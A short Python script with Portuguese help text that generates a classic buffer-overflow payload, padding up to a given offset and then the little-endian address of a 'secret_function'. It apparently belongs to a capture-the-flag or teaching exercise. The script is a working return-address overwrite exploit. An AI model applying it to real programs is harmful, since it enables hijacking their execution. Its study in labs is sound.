#!/usr/bin/env python3
import argparse
import sys


def main():
    parser = argparse.ArgumentParser(
        description="Gera um payload para sobrescrever o return address com secret_function."
    )
    parser.add_argument("offset", type=int, help="Numero de bytes de padding ate ao return address")
    parser.add_argument(
        "address",
        help="Endereco de secret_function em hexadecimal, por exemplo 0x401176",
    )
    parser.add_argument(
        "--full-width",
        action="store_true",
        help="Emite os 8 bytes completos do endereco. Sem esta flag, corta no primeiro byte NUL para uso mais pratico via argv.",
    )
    args = parser.parse_args()

    address = int(args.address, 16)
    address_bytes = address.to_bytes(8, byteorder="little")

    # Em argv/command substitution, bytes NUL embebidos nao sobrevivem bem.
    # Por defeito, emitimos apenas a parte util ate ao primeiro NUL.
    if not args.full_width and b"\x00" in address_bytes:
        address_bytes = address_bytes.split(b"\x00", 1)[0]

    payload = b"A" * args.offset + address_bytes
    sys.stdout.buffer.write(payload)


if __name__ == "__main__":
    main()
